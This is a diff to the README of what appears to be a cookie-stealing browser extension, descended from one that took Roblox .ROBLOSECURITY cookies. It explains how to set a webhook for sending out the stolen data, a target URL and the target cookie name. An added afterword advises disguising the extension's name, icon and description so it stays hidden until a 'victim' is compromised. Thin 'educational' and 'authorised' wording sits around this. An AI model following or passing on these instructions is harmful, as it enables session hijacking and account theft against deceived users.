@@ -8,3 +8,6 @@ The original extension would get your .ROBLOSECURITY cookie, which ROBLOX would 
 
 ### How to use
 Paste your webook into the <strong>WEBHOOK</strong> constant, paste the URL of the website you want to <strong>educationally study with proper authorisation</strong> in the <strong>URL</strong> constant, and finally copy the name of your targeted cookie in the <strong>COOKIE</strong> constant. There's literally a 50 second tutorial on Youtube for installing extensions.
+
+### Afterword
+You might wanna change the name, icon and description of the extension if you want full points on the <strong>authorised</strong> Educational practical use of this extension, to show that you know how to stay under the radar until successfully beaming your hypothetical victim in a cybersecurity social engineering scenario.
